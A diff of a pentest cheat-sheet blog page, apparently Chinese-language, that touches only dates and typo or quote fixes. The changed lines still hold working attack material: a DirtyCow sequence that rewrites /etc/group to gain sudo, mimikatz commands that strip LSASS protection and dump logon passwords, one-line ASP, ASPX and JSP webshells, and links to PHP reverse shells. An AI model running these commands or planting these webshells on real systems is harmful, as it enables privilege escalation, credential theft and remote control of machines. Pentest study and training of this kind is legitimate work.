@@ -33,7 +33,7 @@
 <meta property="og:description" content="迟来的文章">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-02-08T03:15:20.000Z">
-<meta property="article:modified_time" content="2023-06-05T12:19:17.619Z">
+<meta property="article:modified_time" content="2023-07-16T09:04:08.871Z">
 <meta property="article:author" content="xXxYOLOxXx">
 <meta property="article:tag" content="Pentest">
 <meta name="twitter:card" content="summary">
@@ -209,7 +209,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-06-05 20:19:17" itemprop="dateModified" datetime="2023-06-05T20:19:17+08:00">2023-06-05</time>
+                <time title="Modified: 2023-07-16 17:04:08" itemprop="dateModified" datetime="2023-07-16T17:04:08+08:00">2023-07-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -833,7 +833,7 @@ Git提供了一种过滤机制，允许用户在文件检出或提交到Git存�
 <ul>
 <li>DirtyCow</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io</span><br><span class="line">cd dirtycow.github.io</span><br><span class="line">gcc dirtyc0w.c -o dirtycow -pthread</span><br><span class="line">.&#x2F;dirtycow &#x2F;etc&#x2F;group “$(sed ‘&#x2F;\(sudo*\)&#x2F; s&#x2F;$&#x2F;,test&#x2F;’ &#x2F;etc&#x2F;group)”</span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.io</span><br><span class="line">cd dirtycow.github.io</span><br><span class="line">gcc dirtyc0w.c -o dirtycow -pthread</span><br><span class="line">.&#x2F;dirtycow &#x2F;etc&#x2F;group &quot;$(sed ‘&#x2F;\(sudo*\)&#x2F; s&#x2F;$&#x2F;,test&#x2F;’ &#x2F;etc&#x2F;group)&quot;</span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure>
 <ul>
 <li>40616.c</li>
 </ul>
@@ -1154,7 +1154,7 @@ Plain格式固定且已知，枚举Key解密TGS_Tikect，格式匹配即得到Se
 </ul>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpaswords</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
 <ul>
 <li>Protected LSASS
 <ul>
@@ -1167,7 +1167,7 @@ Plain格式固定且已知，枚举Key解密TGS_Tikect，格式匹配即得到Se
 <li>mimikatz<br />
 (mimidrv.sys)</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!+</span><br><span class="line">!processprotect &#x2F;process:lsass.exe &#x2F;remove</span><br><span class="line">sekurlsa::logonpaswords</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!+</span><br><span class="line">!processprotect &#x2F;process:lsass.exe &#x2F;remove</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
 <h2 id="getshell"><a class="markdownIt-Anchor" href="#getshell"></a> GetShell</h2>
 <ul>
 <li>考虑与Pass The Hash或Pass The Ticket结合</li>
@@ -1203,7 +1203,7 @@ Plain格式固定且已知，枚举Key解密TGS_Tikect，格式匹配即得到Se
 <li>PHP_Reverse_Shell: <a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></li>
 <li>PHP_Reverse_Shell_Generic: <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php">https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/master/src/reverse/php_reverse_shell.php</a></li>
 <li>ASP: <code>&lt;%eval request(&quot;BFL&quot;)%&gt;</code></li>
-<li>ASPX: <code>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[&quot;BFL&quot;],”unsafe”);%&gt;</code></li>
+<li>ASPX: <code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;BFL&quot;],&quot;unsafe&quot;);%&gt;</code></li>
 <li>JSP: <code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;BFL&quot;));%&gt;</code></li>
 </ul>
 </li>
